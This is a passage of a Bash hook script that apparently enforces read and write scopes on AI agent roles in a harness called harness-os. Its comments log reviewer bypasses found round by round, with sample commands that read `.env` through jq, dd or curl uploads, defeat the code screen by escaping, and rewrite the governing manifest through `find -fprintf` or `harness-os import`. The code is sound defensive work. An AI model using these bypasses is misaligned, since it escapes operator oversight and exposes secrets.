                  if [ -n "$__rest" ]; then FLAG_TARGETS="${FLAG_TARGETS}${__rest}"$'\n'; else __tf=1; fi ;;
              esac ;;
          esac
        done ;;
      zip|7z|7za|zipcloak|zipnote)
        # The first non-flag operand IS the archive it creates.
        for __i in "${!SEG_WORDS[@]}"; do
          [ "$__i" = "0" ] && continue
          case "${SEG_WORDS[$__i]}" in
            -*) continue ;;
            *) FLAG_TARGETS="${FLAG_TARGETS}${SEG_WORDS[$__i]}"$'\n'; break ;;
          esac
        done ;;
    esac
    [ -n "$FLAG_TARGETS" ] && REDIR_TARGETS=$(printf '%s\n%s' "$REDIR_TARGETS" "$FLAG_TARGETS")

    WRITE_VERB=$(printf '%s' "$seg" | sed -E 's/^([a-z0-9_.\/-]*\/)?([a-z0-9_-]+).*/\2/')
    case "$WRITE_VERB" in
      cp|mv|install|rsync|ln)
        # Destination is the last non-flag operand.
        DEST=$(printf '%s' "$seg" | tr ' ' '\n' | tail -n +2 | grep -vE '^-' | grep -v '^$' | tail -n1 || true)
        [ -n "$DEST" ] && REDIR_TARGETS=$(printf '%s\n%s' "$REDIR_TARGETS" "$DEST")
        ;;
      dd)
        DEST=$(printf '%s' "$seg" | grep -oE '(^|[[:space:]])of=[^[:space:]]+' | sed -E 's/.*of=//' || true)
        [ -n "$DEST" ] && REDIR_TARGETS=$(printf '%s\n%s' "$REDIR_TARGETS" "$DEST")
        ;;
      truncate|shred|touch|chmod|chown)
        DEST=$(printf '%s' "$seg" | tr ' ' '\n' | tail -n +2 | grep -vE '^-' | grep -v '^$' || true)
        [ -n "$DEST" ] && REDIR_TARGETS=$(printf '%s\n%s' "$REDIR_TARGETS" "$DEST")
        ;;
      sed|perl|ruby)
        # In-place editing rewrites every file operand.
        if printf '%s' "$seg" | grep -Eq '(^|[[:space:]])-[a-zA-Z]*i([[:space:]]|$|\.)'; then
          DEST=$(printf '%s' "$seg" | tr ' ' '\n' | tail -n +2 | grep -vE '^-' | grep -v '^$' | tail -n +2 || true)
          [ -n "$DEST" ] && REDIR_TARGETS=$(printf '%s\n%s' "$REDIR_TARGETS" "$DEST")
        fi
        ;;
    esac
    while IFS= read -r target; do
      [ -n "$target" ] || continue
      target=$(printf '%s' "$target" | tr -d '"'"'" | tr -d '\001')
      [ -n "$target" ] || continue
      # Axis 5b on the bash authoring route. The screen was wired only to
      # Write/Edit, so `echo 'require("fs")…' > tests/e2e/x.spec.ts` put
      # the identical code on disk INSIDE the role's own write scope with
      # nothing looking at it, and the role's granted `npx playwright
      # test` then ran it. The segment carries the content for the
      # channels that inline it (echo/printf/cat<<EOF); the copying verbs
      # (cp/mv) carry a path instead, and those are already bounded by the
      # read scope — a role can only copy a file it may read.
      # The content is screened against the WHOLE command, not just this
      # segment: `echo '<code>' | tee spec.ts` carries the code in the
      # segment BEFORE the one naming the file, so a per-segment view
      # would see `tee spec.ts` and find nothing to object to.
      #
      # But for a role whose manifest DECLARES code constraints, the
      # screen refuses this channel outright instead of trying to read it.
      # Screening `$CMD` means matching JS patterns against SHELL syntax,
      # and the two disagree in ways no amount of pattern work reconciles:
      # a single backslash — `require\("fs"\)` — defeats every rule that
      # expects a literal `(`, because the shell strips it and the file on
      # disk is byte-identical to the denied form. A reviewer used that to
      # turn the whole screen off at once.
      #
      # So the honest boundary is: if a role has declared what its code
      # may import or do, it authors code through Write/Edit, where the
      # CONTENT is the tool input and can actually be screened. A role
      # that declares nothing keeps the old advisory behaviour, which is
      # what the docs already say it is.
      CC_IMPORTS=$(harness_os_role_field "$ROLE" '.write.codeImports')
      CC_CAPS=$(harness_os_role_field "$ROLE" '.write.codeCapabilities')
      if [ "$CC_IMPORTS" != "null" ] || [ "$CC_CAPS" != "null" ]; then
        # Executable by extension, OR carrying no extension at all — a
        # file with no suffix is exactly where a `#!/bin/sh` shebang
        # hides, and the extension gate used to skip it entirely.
        EXEC_TARGET=0
        case "${target##*/}" in
          *.js|*.mjs|*.cjs|*.ts|*.mts|*.cts|*.tsx|*.jsx|*.py|*.rb|*.sh|*.bash|*.zsh|*.pl|*.php|*.ipynb|*.lua|*.ps1) EXEC_TARGET=1 ;;
          *.*) EXEC_TARGET=0 ;;             # some other extension: data
          *)   EXEC_TARGET=1 ;;             # no extension: runnable
        esac
        case "$EXEC_TARGET" in
          1)
            harness_os_deny "bash-authoring-executable $(harness_os_relpath "$target")" "[BLOCKED] Role '${ROLE}' may not author '$(harness_os_relpath "$target")' through Bash — an executable file must be written with Write or Edit.

${ROLE_HEADER}

Command: ${CMD}

This role declares what its code may import or do, and that screen needs the file's CONTENT. Through Bash the kernel sees a shell command, not a file: quoting and escaping differ, and \`require\\(\"fs\"\\)\` reaches disk identical to a form the screen refuses. Rather than pretend to read it, this channel is closed for files something can run.

Use the tool whose input IS the content:
  Write  file_path: $(harness_os_relpath "$target")
  Edit   for a change to a file that already exists

Non-executable files (fixtures, notes, JSON) are unaffected."
            ;;
        esac
      fi

      check_code_capabilities "$target" "$CMD" "
Channel: authored via Bash (\`${SEG_WORDS[0]:-}\`) — the same screen applies to every route that puts a file on disk."
      # Root of trust first, and for EVERY write channel. The manifest is
      # read-exempt (a role may read the law it is held to), and a
      # reviewer turned that exemption into a full takeover by writing it
      # with `find -fprintf` — a verb no self-protection list named. Any
      # write target that resolves to the manifest or the state dir is
      # refused here, whatever command produced it.
      self_protect_target "$target" "self-protect bash write-target"
      if [ "$HAS_WRITE_GRANTS" != "1" ]; then
        harness_os_deny "bash-redirect-readonly" "[BLOCKED] Role '${ROLE}' has no write grants, but this command contains a file redirection — Bash must not become a write channel for a read-only role.

${ROLE_HEADER}

Command: ${CMD}

Drop the redirection (pipe to your own context instead of a file), or hand the write to the role that owns the target path."
      fi
      REL_TARGET=$(harness_os_relpath "$target")
      if { [ "$WRITE_DENY" != "null" ] && harness_os_path_in_scope "$REL_TARGET" "$WRITE_DENY"; } \
         || ! harness_os_path_in_scope "$REL_TARGET" "$WRITE_ALLOW"; then
        harness_os_deny "bash-redirect-out-of-scope $REL_TARGET" "[BLOCKED] Role '${ROLE}' may not redirect output into '$REL_TARGET' — it is outside the role's write scope.

${ROLE_HEADER}
write scope: $(printf '%s' "$WRITE_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}

Shell redirection is held to the same write scope as the Write/Edit tools."
      fi
    done <<< "$REDIR_TARGETS"

    # 3e. Read-scope over real files. For a role with a read scope,
    # every token that resolves (glob-aware, via compgen) to an
    # existing file or directory must be inside read.allow ∪
    # write.allow — otherwise `cat .env` through an allowed binary
    # would bypass the Read axis entirely. Tokens that resolve to
    # nothing (flags, patterns, prose) pass; the manifest itself is
    # implicitly readable (it is the law the role is being held to).
    if [ "$READ_ALLOW" != "null" ]; then
      # Operands that are PATTERNS, not paths. `grep package.json src/` does
      # not read package.json, and `find . -name x.json` does not either —
      # in both the operand is a string the command matches against. Held
      # to the read scope they produce denies an operator cannot act on
      # (the file genuinely is out of scope; it is also genuinely not being
      # read). Only the well-defined cases are exempted, by index, and only
      # where the command's own grammar makes the operand a pattern.
      TOK_SKIP=" "
      #
      # ONE DECISION, ONE PLACE. Several commands take a program as their
      # first positional operand — grep a pattern, sed and awk a script,
      # jq a filter — and that operand must be exempt from the read scan
      # or the commonest invocation of each is denied for a `.` or a
      # `*.json` it never opens.
      #
      # The same defect then found each of them in turn: when a FLAG
      # supplies that program (`grep -e`, `sed -e p`, `jq -f prog.jq`)
      # there is no positional program, and the first positional is an
      # INPUT FILE — so exempting it unconditionally handed the exemption
      # to exactly the file the scope exists to cover. grep was fixed in
      # round 4, sed and awk in round 12, jq in round 13. Three blocks,
      # twenty lines apart, the same bug found three times by three
      # different reviewers.
      #
      # So the blocks below no longer decide. Each one only REPORTS two
      # things — whether a flag supplied the program (__has_prog_flag),
      # and which operand is the positional program if there is one
      # (__prog_idx) — and the single line after the `esac` makes the
      # exemption. A block added later cannot forget the guard, because
      # forgetting it is no longer possible: it does not write that line.
      __has_prog_flag=0; __prog_idx=""
      case "${SEG_WORDS[0]:-}" in
        grep|egrep|fgrep|rgrep|rg|ag|ack|ripgrep)
          # -e PAT / -f FILE change the grammar: with either present there
          # is no positional pattern, and -f's operand is a real file read.
          __skip_next=0
          for __i in "${!SEG_WORDS[@]}"; do
            [ "$__i" = "0" ] && continue
            __w="${SEG_WORDS[$__i]}"
            if [ "$__skip_next" = "1" ]; then __skip_next=0; continue; fi
            case "$__w" in
              -e|--regexp) __has_prog_flag=1; TOK_SKIP="${TOK_SKIP}$((__i + 1)) "; __skip_next=1; continue ;;
              -f|--file)   __has_prog_flag=1; __skip_next=1; continue ;;
              -e*|--regexp=*) __has_prog_flag=1; continue ;;
              -f*|--file=*)   __has_prog_flag=1; continue ;;
              -*) continue ;;
            esac
            [ -n "$__prog_idx" ] || __prog_idx="$__i"
          done
          ;;
        jq|yq|gojq|jaq)
          # jq's first operand is a FILTER, and the commonest filter of
          # all is `.` — which resolves to the cwd and was denied as an
          # out-of-scope read. An inspector piping the page repository
          # through `jq .` is doing the most ordinary thing its mandate
          # describes, and being refused for it.
          #
          # Which operand is the filter depends on how many operands each
          # preceding option eats, and getting that count wrong does not
          # fail safe here: the exemption lands on whatever token the
          # miscount points at. `--rawfile` and `--slurpfile` take TWO
          # operands and were counted as one, so the scan skipped the
          # NAME, mistook the FILE for the filter, and exempted it —
          # `jq -n --rawfile x .env '$x'` read any file on the machine
          # with every other axis working perfectly. The filter is
          # single-quoted, so no shell expansion happens and the
          # var-expansion rule has nothing to catch either.
          #
          # Two distinctions carry the whole block, and they are separate:
          # how many operands an option consumes, and whether any of them
          # is a path this tool will OPEN. An option's operand is exempted
          # only when it is provably not a path; a file operand is always
          # left to the scope check, even when that means naming it here.
          __skip_n=0
          for __i in "${!SEG_WORDS[@]}"; do
            [ "$__i" = "0" ] && continue
            __w="${SEG_WORDS[$__i]}"
            if [ "$__skip_n" -gt 0 ]; then __skip_n=$((__skip_n - 1)); continue; fi
            case "$__w" in
              # NAME VALUE — two operands, neither of which jq opens.
              --arg|--argjson)
                TOK_SKIP="${TOK_SKIP}$((__i + 1)) $((__i + 2)) "; __skip_n=2; continue ;;
              # NAME FILE — two operands, and the second IS a file read.
              # Exempt the name; the file stays scope-checked.
              --slurpfile|--rawfile)
                TOK_SKIP="${TOK_SKIP}$((__i + 1)) "; __skip_n=2; continue ;;
              # One operand, not a path.
              --indent)
                TOK_SKIP="${TOK_SKIP}$((__i + 1)) "; __skip_n=1; continue ;;
              # One operand which IS a path: consumed, so it is never
              # mistaken for the filter, but NOT exempted.
              #
              # `-L` sat in the line above for being "not a path", and it
              # is jq's library search path — `jq -L docs 'import
              # "e2e-ledger" as $d; $d'` reads docs/e2e-ledger.json. The
              # module name lives in the filter, which is exempt too, so
              # neither the directory nor the file resolved from it ever
              # reached the scope check. Removing `-L` from the exempt
              # group is not enough on its own: it must still consume its
              # operand, or the directory becomes the first positional
              # and is exempted as the filter instead.
              -L) __skip_n=1; continue ;;
              # One operand which IS a file, and which supplies the
              # FILTER — so it stays scope-checked, and there is no
              # positional filter left to exempt.
              -f|--from-file) __has_prog_flag=1; __skip_n=1; continue ;;
              -f*|--from-file=*) __has_prog_flag=1; continue ;;
              # No operand at all — these only change how later
              # positionals are read, and were consuming one each.
              --args|--jsonargs) continue ;;
              -*) continue ;;
            esac
            [ -n "$__prog_idx" ] || __prog_idx="$__i"
          done
          ;;
        sed|awk|gawk|mawk)
          # The first positional operand is the program text; the rest are
          # input files and stay scope-checked.
          #
          # Unless a flag already supplied the program. `sed -e p .env`
          # and `awk -f prog.awk .env` carry the program in the FLAG,
          # which makes the first positional an input FILE — and
          # exempting it unconditionally handed the exemption to exactly
          # the file the scope exists to cover. grep's block has guarded
          # this case since round 4 with __has_pat_flag; sed and awk sat
          # beside it for eleven rounds without the same guard. When a
          # program flag is present there is no positional program, so
          # nothing here is exempt.
          #
          # `-v`/`--assign` is the one that must NOT set the guard: it
          # carries a variable binding, and the program is still the
          # first positional after it.
          __skip_next=0
          for __i in "${!SEG_WORDS[@]}"; do
            [ "$__i" = "0" ] && continue
            __w="${SEG_WORDS[$__i]}"
            if [ "$__skip_next" = "1" ]; then __skip_next=0; continue; fi
            case "$__w" in
              -e|-f|--expression|--file) __has_prog_flag=1; __skip_next=1; continue ;;
              -e*|-f*|--expression=*|--file=*) __has_prog_flag=1; continue ;;
              -v|--assign) __skip_next=1; continue ;;
              -*) continue ;;
            esac
            [ -n "$__prog_idx" ] || __prog_idx="$__i"
          done
          ;;
      esac
      # THE decision — the only place any of the blocks above is exempted
      # from the read scan. A program flag means there is no positional
      # program, and every positional is an input file.
      [ "$__has_prog_flag" = "0" ] && [ -n "$__prog_idx" ] && TOK_SKIP="${TOK_SKIP}${__prog_idx} "

      # An exempted program can still NAME a file, and then the exemption
      # is carrying the read. jq's `import "docs/e2e-ledger" as $d` loads
      # docs/e2e-ledger.json from inside the filter — the one operand this
      # block deliberately exempts — so the path never reached the scan at
      # all, with or without a `-L` directory to search. Round 14 found
      # the `-L` half of this; the module literal is the other half, and
      # it needs no flag whatsoever.
      #
      # So the module names are resolved here and scope-checked like any
      # other read: against the cwd and against each `-L` directory, and
      # only where a candidate actually exists, which is what keeps a
      # module that resolves to nothing from costing anything.

      case "${SEG_WORDS[0]:-}" in
        jq|gojq|jaq)
          JQ_MODS=$(printf '%s\n' "${SEG_WORDS[@]}" \
            | grep -oE '(import|include)[[:space:]]*"[^"]*"' 2>/dev/null \
            | sed 's/.*"\([^"]*\)"/\1/' || true)
          if [ -n "$JQ_MODS" ]; then
            JQ_BASES=("$HOS_CWD")
            __skip_next=0
            for __i in "${!SEG_WORDS[@]}"; do
              [ "$__i" = "0" ] && continue
              __w="${SEG_WORDS[$__i]}"
              if [ "$__skip_next" = "1" ]; then __skip_next=0; JQ_BASES+=("$__w"); continue; fi
              case "$__w" in -L) __skip_next=1 ;; -L?*) JQ_BASES+=("${__w#-L}") ;; esac
            done
            while IFS= read -r __mod; do
              [ -n "$__mod" ] || continue
              for __b in "${JQ_BASES[@]}"; do
                case "$__b" in /*) : ;; *) __b="${HOS_CWD%/}/$__b" ;; esac
                for __ext in .jq .json ""; do
                  __cand="$__b/$__mod$__ext"
                  [ -f "$__cand" ] || continue
                  harness_os_is_manifest_path "$__cand" && continue
                  __rel=$(harness_os_relpath "$__cand")
                  if [ "$READ_DENY" != "null" ] && harness_os_path_in_scope "$__rel" "$READ_DENY"; then :
                  elif harness_os_path_in_scope "$__rel" "$READ_ALLOW"; then continue
                  elif [ "$HAS_WRITE_GRANTS" = "1" ] && harness_os_path_in_scope "$__rel" "$WRITE_ALLOW"; then continue
                  fi
                  set +f
                  harness_os_deny "bash-jq-module-out-of-scope $__rel" "[BLOCKED] Role '${ROLE}' may not import '$__mod' — it resolves to '$__rel', which is outside the role's read scope.

${ROLE_HEADER}
read scope: $(printf '%s' "$READ_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}

A jq filter is exempt from the read scan because it is a program, not a path — but \`import\`/\`include\` inside one names a file that jq really opens, so the module is scope-checked like any other read. Import only modules inside this role's read scope."
                done
              done
            done <<< "$JQ_MODS"
          fi
          ;;
      esac
      if [ "${SEG_WORDS[0]:-}" = "find" ]; then
        for __i in "${!SEG_WORDS[@]}"; do
          case "${SEG_WORDS[$__i]}" in
            -name|-iname|-path|-ipath|-wholename|-iwholename|-regex|-iregex|-lname|-ilname)
              TOK_SKIP="${TOK_SKIP}$((__i + 1)) " ;;
          esac
        done
      fi

      # Quote-aware word split. A word the shell would glob-expand arrives
      # as U<word> and is expanded here too; a fully quoted word arrives as
      # Q<word> and is a LITERAL — expanding it would invent reads that
      # cannot happen, which is exactly how `find tests -name "*.json"`
      # came to be denied for touching package.json.
      TOK_N=0
      TOK_IDX=-1
      TOK_SAW_PATH=0
      set -f
      while IFS= read -r TOKW; do
        # Same producer as SEG_WORDS, so the index lines up with it — that
        # is what lets TOK_SKIP name operands positionally.
        TOK_IDX=$((TOK_IDX + 1))
        [ -n "$TOKW" ] || continue
        TOK_QUOTED=0
        case "$TOKW" in Q*) TOK_QUOTED=1 ;; esac
        tok="${TOKW#?}"
        [ -n "$tok" ] || continue
        case "$TOK_SKIP" in *" $TOK_IDX "*) continue ;; esac
        # Fail CLOSED on an over-long segment: skipping the tail would
        # let a padded command hide an out-of-scope path past the cap.
        TOK_N=$((TOK_N + 1))
        if [ "$TOK_N" -gt 400 ]; then
          set +f
          harness_os_deny "bash-too-many-tokens" "[BLOCKED] Role '${ROLE}' ran a command segment with more than 400 arguments, which the kernel will not scope-check exhaustively.

${ROLE_HEADER}

Command: ${CMD}

A segment this long cannot be verified against the role's read scope, so it is refused rather than partially checked. Split the work into smaller commands naming the files you actually need."
        fi
        case "$tok" in
          file://*)
            # A `file://` URL is a PATH wearing a URL's clothes, and this
            # scan used to skip it with every other scheme. Round 32 fed
            # one to `playwright open` and read a file no scope allowed:
            # the browser opens the path directly, and nothing on the
            # command line looked like a path. The WebFetch axis has
            # unwrapped this since round 22 — one more channel that had
            # the rule and one that did not.
            tok="${tok#file://}"
            tok="${tok#localhost}"
            case "$tok" in /*) : ;; *) tok="/$tok" ;; esac
            tok="${tok%%\?*}"; tok="${tok%%#*}"
            [ -n "$tok" ] || continue
            ;;
          *://*) continue ;;           # any other scheme: never a local file
          -*=*)
            # A FLAG can carry a path in its value, and several read one:
            # `sort --files0-from=<file>`, `grep --file=<file>`,
            # `--config=<file>`. Skipping the whole token let those read
            # anything. Scope-check the value instead — a value that is
            # not an existing path (`--reporter=line`) still costs
            # nothing, because the existence test below filters it.
            tok="${tok#*=}"
            [ -n "$tok" ] || continue
            ;;
          -*)
            # A short flag can also carry its value ATTACHED, with no `=`
            # to mark it — and several of those values are files the
            # command opens: `grep -f.env`, `sed -f.env`, `awk -f.env`
            # each read that file, while `grep --file=.env` was caught
            # by the branch above. Skipping the whole token let the
            # attached spelling read anything.
            #
            # This is round 11's defect in its other form. There an
            # exemption was aimed at a file; here a file was never
            # presented for checking at all. Both come of reasoning
            # about flags by shape instead of by what they open.
            #
            # Rather than enumerate every command's attached-value
            # grammar — the losing game — strip the flag letter and let
            # the existence test downstream decide. A remainder that is
            # not a real path (`-rf`, `-m5`, `-name`) costs nothing,
            # because nothing exists at it. The one shape that would
            # misfire is a PATTERN carried the same way, so the handful
            # of flags whose attached value is a pattern rather than a
            # path are named here and left alone.
            case "${SEG_WORDS[0]:-}:$tok" in
              grep:-e*|egrep:-e*|fgrep:-e*|rgrep:-e*|rg:-e*|ag:-e*|ack:-e*|ripgrep:-e*) continue ;;
              sed:-e*|awk:-v*|gawk:-v*|mawk:-v*) continue ;;
            esac
            case "$tok" in
              --*) continue ;;           # long options spell values with `=`
              -?*) tok="${tok#-?}" ;;    # short flag with an attached value
              *) continue ;;
            esac
            [ -n "$tok" ] || continue
            ;;
          *=*)
            # NAME=value is normally an env assignment — the value is
            # data for the command, not a file it opens, and
            # PLAYWRIGHT_BROWSERS_PATH=/opt/… is ordinary setup rather
            # than a read. `dd` is the exception that matters: its
            # operands are spelled exactly that way and two of them ARE
            # paths, so `dd if=.env` wore the one disguise this branch
            # waves through.
            case "${SEG_WORDS[0]:-}:$tok" in
              dd:if=*|dd:of=*) tok="${tok#*=}"; [ -n "$tok" ] || continue ;;
              # `NAME=@PATH` is a file reference wearing the assignment's
              # clothes — curl's `-F field=@file` uploads that file. The
              # `@` is what distinguishes it from a value.
              *=@?*) tok="${tok#*=}" ;;
              # And `NAME=<PATH` is the same thing with curl's other
              # spelling: `-F 'x=<.env'` sends the file's CONTENTS as the
              # field value. Quoted, so the `<` is not a shell redirect
              # and never reached the redirect masking that would have
              # caught it.
              *=\<?*) tok="${tok#*=<}"; [ -n "$tok" ] || continue ;;
              *) continue ;;
            esac
            ;;
        esac
        # `@PATH` is the conventional "read this file here" spelling —
        # curl's `-d @file` / `--data-binary @file`, and the response-file
        # form several other tools take. Nothing is literally named
        # `@.env`, so the existence test below waved the token through as
        # harmless while curl opened the path and posted its contents.
        # De-sugared last, so it applies however the token arrived: bare,
        # attached to a short flag, or after an `=`.
        case "$tok" in @?*) tok="${tok#@}" ;; esac
        # The target of a no-op cd — or of a no-op `git -C` / `--work-tree`,
        # already validated above — is the directory this call already runs
        # in. Naming it is not a read of anything new. This is deliberately
        # narrow: a bare `.` operand to a content-reading command (grep -r
        # foo .) is NOT exempt, because that really does read everything.
        if { [ "$CD_NOOP" = "1" ] || [ -n "$GIT_ANCHOR" ]; } \
           && [ "$(harness_os_normalize_path "$tok")" = "$(harness_os_normalize_path "$HOS_CWD")" ]; then
          continue
        fi
        # An expansion inside a PATH-SHAPED token cannot be scope-checked
        # — the kernel never expands it, so `cat $PWD/.env` would slip
        # past this scan as an unresolvable token. Only reachable when
        # the role permits an expansion construct (otherwise axis 3a
        # already denied the segment); a bare `$VAR` with no separator
        # (echo $HOME, git commit -m "$MSG") stays fine.
        case "$tok" in
          *'$'*/*|*/*'$'*|*'`'*/*|*/*'`'*)
            set +f
            harness_os_deny "bash-unverifiable-path-expansion" "[BLOCKED] Role '${ROLE}' used a shell expansion inside a path argument ('$tok'), which the kernel cannot resolve — so it cannot be checked against the role's read scope.

${ROLE_HEADER}
read scope: $(printf '%s' "$READ_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}

Write the path literally (relative to the project root) so it can be scope-checked. An expansion is permitted for this role in non-path arguments; a path built by expansion would make the read scope unenforceable."
            ;;
        esac
        case "$tok" in "~") tok="$HOME" ;; "~/"*) tok="$HOME/${tok#\~/}" ;; esac
        # NB: no `--` before the pattern — `compgen -G -- x` silently
        # matches nothing (bash quirk). Flag-shaped tokens are already
        # skipped above, so bare -G is safe. compgen echoes a
        # metacharacter-free pattern back even when it matches nothing,
        # so every candidate is confirmed with a real existence test
        # below before it can trigger a deny.
        if [ "$TOK_QUOTED" = "1" ]; then
          # Quoted: no expansion. The word names itself, and only itself.
          MATCHES="$tok"
        else
          MATCHES=$(cd "$HOS_CWD" 2>/dev/null && compgen -G "$tok" 2>/dev/null || true)
        fi
        [ -n "$MATCHES" ] || continue
        while IFS= read -r m; do
          [ -n "$m" ] || continue
          # Confirm the candidate actually exists (resolve relative to
          # the command's cwd) — this is what makes a non-matching
          # literal like a URL or a bare word harmless.
          case "$m" in
            /*) [ -e "$m" ] || continue ;;
            *)  [ -e "$HOS_CWD/$m" ] || continue ;;
          esac
          # This segment names at least one path that really exists, so
          # it is not one of the pathless reads screened after the loop.
          # Set before the manifest exemption: naming the manifest is
          # still naming a path.
          TOK_SAW_PATH=1
          harness_os_is_manifest_path "$m" && continue
          REL_M=$(harness_os_relpath "$m")
          DENIED_READ=0
          if [ "$READ_DENY" != "null" ] && harness_os_path_in_scope "$REL_M" "$READ_DENY"; then
            DENIED_READ=1
          elif harness_os_path_in_scope "$REL_M" "$READ_ALLOW"; then
            continue
          elif [ "$HAS_WRITE_GRANTS" = "1" ] && harness_os_path_in_scope "$REL_M" "$WRITE_ALLOW"; then
            continue
          else
            DENIED_READ=1
          fi
          if [ "$DENIED_READ" = "1" ]; then
            set +f
            harness_os_deny "bash-read-out-of-scope $REL_M" "[BLOCKED] Role '${ROLE}' may not touch '$REL_M' via Bash — it is outside the role's read scope.

${ROLE_HEADER}
read scope: $(printf '%s' "$READ_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}

Bash file access is held to the same read scope as the Read tool — the scope is the role's context diet, whichever channel does the reading."
          fi
        done <<< "$MATCHES"
      done < <(printf '%s\n' "$seg" | harness_os_shell_words)
      set +f

      # 3f. The read that names no path. `grep -r PATTERN` searches the
      # whole tree from the cwd; so does `rg PATTERN`, a bare `find`, a
      # bare `ls`, a bare `tree`. The scan above only sees operands, and
      # those commands have none — so the single most ordinary thing an
      # inspector does read every file in the project, `.env` included,
      # while every EXPLICIT spelling of the same act was already
      # refused:
      #
      #   grep -rn ADMIN_TOKEN .   -> DENY   (`.` resolves to the cwd)
      #   grep -rn ADMIN_TOKEN     -> ALLOW  (same act, no operand)
      #   ls .                     -> DENY
      #   ls                       -> ALLOW
      #   find . -name x           -> DENY
      #   find -name x             -> ALLOW
      #
      # The Grep TOOL arm has held this line since round 1 — no `path`
      # means the search runs from the root, so the root needs a
      # root-wide grant — and the Bash channel never got the copy. Round
      # 22's sentence on a channel round 22 did not sweep, and round
      # 11's sentence too: two spellings of one act, one of them checked.
      #
      # The test is not "does this command look recursive" but "did this
      # segment name a path at all". A command that names one is already
      # scope-checked above, whatever it does with it; a command that
      # names none, from the list below, reads the directory it runs in.
      # That inverts cleanly and needs no per-flag knowledge: `ls -w 80`
      # and `find -maxdepth 2 -name x` are caught without either flag
      # being modelled.
      if [ "$TOK_SAW_PATH" = "0" ]; then
        CWD_READER=0
        case "${SEG_WORDS[0]:-}" in
          # Recursive by construction: no path operand means the cwd.
          rg|ripgrep|ag|ack|ack-grep|fd|fdfind|rgrep|find|ls|dir|vdir|tree|du) CWD_READER=1 ;;
          # The grep family reads STDIN when given no path, which is
          # inert — unless a recursion flag makes it walk the cwd.
          grep|egrep|fgrep)
            for __w in "${SEG_WORDS[@]:1}"; do
              case "$__w" in
                --recursive|--dereference-recursive) CWD_READER=1 ;;
                --*) : ;;
                -*[rR]*) CWD_READER=1 ;;
              esac
            done ;;
        esac
        if [ "$CWD_READER" = "1" ]; then
          CWD_REL=$(harness_os_relpath "$HOS_CWD")
          [ -n "$CWD_REL" ] || CWD_REL="."
          CWD_OK=0
          if [ "$READ_DENY" != "null" ] && harness_os_path_in_scope "$CWD_REL" "$READ_DENY"; then CWD_OK=0
          elif harness_os_path_in_scope "$CWD_REL" "$READ_ALLOW"; then CWD_OK=1
          elif [ "$HAS_WRITE_GRANTS" = "1" ] && harness_os_path_in_scope "$CWD_REL" "$WRITE_ALLOW"; then CWD_OK=1
          fi
          if [ "$CWD_OK" = "0" ]; then
            set +f
            harness_os_deny "bash-pathless-read $CWD_REL" "[BLOCKED] Role '${ROLE}' ran '${SEG_WORDS[0]}' without naming a path, which reads the directory the command runs in ('$CWD_REL') — and that is outside the role's read scope.

${ROLE_HEADER}
read scope: $(printf '%s' "$READ_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)

Command: ${CMD}

Your command group DOES grant '${SEG_WORDS[0]}'. This refusal is about WHERE it reads, not whether you may run it: with no path operand it walks the whole project, so it is held to the same scope as naming that directory outright, which is refused for this role too. Name a path inside your read scope instead: $(printf '%s' "$READ_ALLOW" | "$JQ" -r '.[0] // "<a path in scope>"' 2>/dev/null)"
          fi
        fi
      fi
    fi

    # 3h. THE KERNEL'S OWN CLI IS A MANIFEST-WRITE CHANNEL.
    #
    # Self-protection screens a command's ARGV for the protected path —
    # redirect targets, mutate verbs, flag operands. `harness-os import
    # <bundle> --activate` never names the manifest: the CLI writes it
    # through its own `writeFileSync`. So the axis whose entire job is
    # keeping the manifest immutable did not know its own tool existed.
    #
    # Round 42 built a bundle with `harness-os export` — which computes a
    # VALID fingerprint, so that check is no obstacle to someone
    # authoring the whole bundle — placed it inside a role's own write
    # scope, and ran the import. A role scoped to `write: ["src/**"]`
    # rewrote itself to `write: ["**"]` with `bash.unrestricted: true`.
    # `--activate` also wipes the state directory, which the same axis
    # lists as protected. `harness-os use <name>` is quieter still: its
    # operand is a library NAME, so not even the read-scope check has a
    # path to catch.
    #
    # This is round 15 (curl's write flags), round 31 (npm's postinstall)
    # and round 37 (PATH) in the place where the kernel owns BOTH ends —
    # the protected artifact and the program that writes it. The two were
    # never connected.
    #
    # Refused by construction rather than by pattern: a governed role
    # does not reconfigure the harness it is governed by. `validate`,
    # `explain`, `status`, `doctor` and `brief` read and are untouched;
    # `run` is the wrapper and is untouched.
    if [ "$HOS_TOOL" = "Bash" ]; then
      CLI_IDX=""
      case "${SEG_WORDS[0]:-}" in
        harness-os) CLI_IDX=1 ;;
        npx|pnpm|yarn|bunx)
          # Skip the wrapper's own FLAGS. `npx --yes harness-os use x`
          # put one word between the two names and walked past a check
          # that read index 1 — the exact-vs-attached defect this
          # document has recorded six times, in the fix for it.
          for __i in "${!SEG_WORDS[@]}"; do
            [ "$__i" = "0" ] && continue
            case "${SEG_WORDS[$__i]}" in
              -*) continue ;;
              exec) continue ;;
              harness-os|@civitas-cerebrum/harness-os) CLI_IDX=$((__i + 1)); break ;;
              *) break ;;
            esac
          done ;;
        node|nodejs|bun|deno)
          for __i in "${!SEG_WORDS[@]}"; do
            case "${SEG_WORDS[$__i]}" in
              *harness-os/bin/cli.mjs|*/harness-os/bin/cli.mjs|cli.mjs)
                case "${SEG_WORDS[$__i]}" in *harness-os*) CLI_IDX=$((__i + 1)) ;; esac ;;
            esac
          done ;;
      esac
      if [ -n "$CLI_IDX" ]; then
        CLI_SUB=""
        for __i in "${!SEG_WORDS[@]}"; do
          [ "$__i" -lt "$CLI_IDX" ] && continue
          case "${SEG_WORDS[$__i]}" in -*) continue ;; esac
          CLI_SUB="${SEG_WORDS[$__i]}"; break
        done
        case "$CLI_SUB" in
          init|import|use)
            set +f
            harness_os_deny "self-protect harness-os-cli:${CLI_SUB}" "[BLOCKED] Role '${ROLE}' may not run 'harness-os ${CLI_SUB}' — that subcommand rewrites the manifest this role is governed by.

${ROLE_HEADER}

Command: ${CMD}

Self-protection screens a command for the protected path, and this one never names it: the CLI writes '.claude/harness-os.json' itself. A governed role does not reconfigure the harness that governs it, so the subcommand is refused rather than the path — 'import --activate' also replaces the state directory, and 'use' names a library entry with no path at all.

The read-only subcommands are unaffected: validate, explain, status, doctor and brief, and the 'run' wrapper. Changing the manifest is the operator's, from a session this kernel is not governing."
            ;;
        esac
      fi
    fi

